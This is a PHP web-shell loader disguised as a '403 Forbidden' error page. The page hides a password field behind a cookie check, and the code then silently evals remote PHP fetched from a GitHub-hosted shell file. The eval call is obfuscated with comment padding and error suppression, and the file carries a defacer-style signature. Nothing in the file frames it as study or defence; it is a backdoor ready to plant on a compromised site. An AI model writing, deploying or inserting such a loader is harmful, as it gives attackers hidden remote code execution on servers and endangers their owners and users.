<?php
$hashed_password = 'f004869e14841582b1a28b84437ec970';

function Login() {
  die("<html>
  <title>403 Forbidden</title>
  <center><h1>403 Forbidden</h1></center>
  <hr><center></center>
  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if (!empty($auth_pass)) {
    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
?>
<?=/****/@/*54134*/null; /******/@/*54134*/error_reporting(0);/****/@/*54134*/null; /******/@/*54134*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/rexorid/shell/refs/heads/main/isialfanew.php"))/******/ /*By ./Mr403Forbidden*/?>
